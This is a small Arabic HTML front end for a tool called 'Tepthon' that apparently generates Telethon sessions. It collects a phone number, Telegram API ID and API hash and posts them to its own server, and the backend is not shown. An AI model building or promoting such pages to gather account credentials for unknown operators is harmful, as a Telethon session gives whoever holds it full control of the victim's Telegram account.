
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Tepthon</title>
</head>
<body style="background:#111; color:#0f0; text-align:center; padding-top:50px;">
    <h1>Tepthon</h1>
    <p>استخراج جلسة تليثون</p>
    <input id="phone" placeholder="رقم الهاتف"><br><br>
    <input id="api_id" placeholder="API ID"><br><br>
    <input id="api_hash" placeholder="API HASH"><br><br>
    <button onclick="sendCode()">إرسال الكود</button>
    <script>
    async function sendCode() {
        const phone = document.getElementById('phone').value;
        const api_id = document.getElementById('api_id').value;
        const api_hash = document.getElementById('api_hash').value;

        const response = await fetch('/send_code', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone, api_id, api_hash })
        });
        const result = await response.json();
        alert(result.message);
    }
    </script>
</body>
</html>
